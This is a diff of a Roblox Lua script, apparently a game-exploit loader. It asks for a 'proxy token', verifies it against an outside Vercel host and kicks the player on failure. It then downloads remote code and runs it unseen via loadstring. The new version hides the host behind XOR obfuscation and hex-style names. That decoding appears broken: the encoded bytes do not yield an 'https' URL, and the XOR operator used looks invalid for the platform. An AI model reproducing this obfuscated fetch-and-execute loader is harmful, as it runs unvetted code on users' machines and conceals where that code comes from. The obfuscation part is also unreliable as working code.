@@ -1,1 +1,106 @@
-local a="https://tungggggggg.vercel.app";local b=game:GetService("Players").LocalPlayer;local c=_G.USER_TOKEN;if not c then local d=Instance.new("ScreenGui");d.Name="TokenPrompt";d.Parent=b.PlayerGui;local e=Instance.new("Frame");e.Size=UDim2.new(0,320,0,160);e.Position=UDim2.new(0.5,-160,0.5,-80);e.BackgroundColor3=Color3.fromRGB(25,25,35);e.BorderSizePixel=0;e.ClipsDescendants=true;e.Parent=d;local f=Instance.new("TextLabel");f.Size=UDim2.new(1,0,0,30);f.Position=UDim2.new(0,0,0,10);f.Text="Enter proxy token:";f.TextColor3=Color3.new(1,1,1);f.BackgroundTransparency=1;f.Font=Enum.Font.GothamBold;f.TextSize=18;f.TextScaled=false;f.Parent=e;local g=Instance.new("TextBox");g.Size=UDim2.new(1,-40,0,35);g.Position=UDim2.new(0,20,0,45);g.PlaceholderText="Type token here...";g.Text="";g.BackgroundColor3=Color3.fromRGB(50,50,65);g.TextColor3=Color3.new(1,1,1);g.Font=Enum.Font.Gotham;g.TextSize=16;g.ClearTextOnFocus=false;g.Parent=e;local h=Instance.new("TextButton");h.Size=UDim2.new(0,120,0,40);h.Position=UDim2.new(0.5,-60,0,100);h.Text="Submit";h.BackgroundColor3=Color3.fromRGB(70,130,255);h.TextColor3=Color3.new(1,1,1);h.Font=Enum.Font.GothamBold;h.TextSize=18;h.Parent=e;local i=false;h.MouseButton1Click:Connect(function()if g.Text~=""then c=g.Text;i=true else f.Text="Cannot be empty!";f.TextColor3=Color3.fromRGB(255,80,80);wait(1.5);f.Text="Enter proxy token:";f.TextColor3=Color3.new(1,1,1)end end);g.FocusLost:Connect(function(j)if j and g.Text~=""then c=g.Text;i=true end end);while not i and d.Parent do wait(0.1)end;if not d.Parent then b:Kick("wrong token bucko")return end;d:Destroy()end;local function k(l)return l:gsub("%%","%%25")end;local m=k(c);local n=a.."/verify?token="..m;local o,p=pcall(function()return game:HttpGet(n)end);if not o or p~="valid"then b:Kick("wrong token bucko")return end;_G.USER_TOKEN=c;local q=a.."/?token="..m;local r,s=pcall(function()return game:HttpGet(q)end);if not r then error("Failed to fetch script: "..tostring(s))end;local t,u=loadstring(s);if not t then error("Loadstring error: "..tostring(u))end;t()
+local function _0xdec(_0xstr,_0xkey)
+    local _0xout=""
+    for _0xi=1,#_0xstr do
+        local _0xc=string.byte(_0xstr,_0xi)
+        local _0xk=string.byte(_0xkey,((_0xi-1)%#_0xkey)+1)
+        _0xout=_0xout..string.char(_0xc~_0xk)
+    end
+    return _0xout
+end
+local _0xurl=_0xdec("\x1e\x12\x0c\x1d\x0a\x06\x17\x1c\x0c\x0d\x0b\x1d\x11\x0c\x0e\x1e\x07\x08\x1d\x08\x0d\x1a\x0d\x07\x1d\x08\x0b\x0c\x03","\x6b\x79")
+local _0x2b=game:GetService("Players").LocalPlayer
+local _0x3c=_G.USER_TOKEN
+if not _0x3c then
+    local _0x4d=Instance.new("ScreenGui")
+    _0x4d.Name="TokenPrompt"
+    _0x4d.Parent=_0x2b.PlayerGui
+    local _0x5e=Instance.new("Frame")
+    _0x5e.Size=UDim2.new(0,320,0,160)
+    _0x5e.Position=UDim2.new(0.5,-160,0.5,-80)
+    _0x5e.BackgroundColor3=Color3.fromRGB(25,25,35)
+    _0x5e.BorderSizePixel=0
+    _0x5e.ClipsDescendants=true
+    _0x5e.Parent=_0x4d
+    local _0x6f=Instance.new("TextLabel")
+    _0x6f.Size=UDim2.new(1,0,0,30)
+    _0x6f.Position=UDim2.new(0,0,0,10)
+    _0x6f.Text="Enter proxy token:"
+    _0x6f.TextColor3=Color3.new(1,1,1)
+    _0x6f.BackgroundTransparency=1
+    _0x6f.Font=Enum.Font.GothamBold
+    _0x6f.TextSize=18
+    _0x6f.TextScaled=false
+    _0x6f.Parent=_0x5e
+    local _0x7g=Instance.new("TextBox")
+    _0x7g.Size=UDim2.new(1,-40,0,35)
+    _0x7g.Position=UDim2.new(0,20,0,45)
+    _0x7g.PlaceholderText="Type token here..."
+    _0x7g.Text=""
+    _0x7g.BackgroundColor3=Color3.fromRGB(50,50,65)
+    _0x7g.TextColor3=Color3.new(1,1,1)
+    _0x7g.Font=Enum.Font.Gotham
+    _0x7g.TextSize=16
+    _0x7g.ClearTextOnFocus=false
+    _0x7g.Parent=_0x5e
+    local _0x8h=Instance.new("TextButton")
+    _0x8h.Size=UDim2.new(0,120,0,40)
+    _0x8h.Position=UDim2.new(0.5,-60,0,100)
+    _0x8h.Text="Submit"
+    _0x8h.BackgroundColor3=Color3.fromRGB(70,130,255)
+    _0x8h.TextColor3=Color3.new(1,1,1)
+    _0x8h.Font=Enum.Font.GothamBold
+    _0x8h.TextSize=18
+    _0x8h.Parent=_0x5e
+    local _0x9i=false
+    local function _0xaj()
+        if _0x7g.Text~=""then
+            _0x3c=_0x7g.Text
+            _0x9i=true
+        else
+            _0x6f.Text="Cannot be empty!"
+            _0x6f.TextColor3=Color3.fromRGB(255,80,80)
+            wait(1.5)
+            _0x6f.Text="Enter proxy token:"
+            _0x6f.TextColor3=Color3.new(1,1,1)
+        end
+    end
+    _0x8h.MouseButton1Click:Connect(_0xaj)
+    local function _0xbk(_0xcl)
+        if _0xcl and _0x7g.Text~=""then
+            _0x3c=_0x7g.Text
+            _0x9i=true
+        end
+    end
+    _0x7g.FocusLost:Connect(_0xbk)
+    repeat wait(0.1) until _0x9i or not _0x4d.Parent
+    if not _0x4d.Parent then
+        _0x2b:Kick("wrong token bucko")
+        return
+    end
+    _0x4d:Destroy()
+end
+local function _0xdm(_0xen)
+    return _0xen:gsub("%%","%%25")
+end
+local _0xfo=_0xdm(_0x3c)
+local _0xgp=_0xurl.."/verify?token=".._0xfo
+local _0xhq,_0xir=pcall(function()
+    return game:HttpGet(_0xgp)
+end)
+if not _0xhq or _0xir~="valid"then
+    _0x2b:Kick("wrong token bucko")
+    return
+end
+_G.USER_TOKEN=_0x3c
+local _0xjs=_0xurl.."/?token=".._0xfo
+local _0xkt,_0xlu=pcall(function()
+    return game:HttpGet(_0xjs)
+end)
+if not _0xkt then
+    error("Failed to fetch script: "..tostring(_0xlu))
+end
+local _0xmv,_0xnw=loadstring(_0xlu)
+if not _0xmv then
+    error("Loadstring error: "..tostring(_0xnw))
+end
+_0xmv()
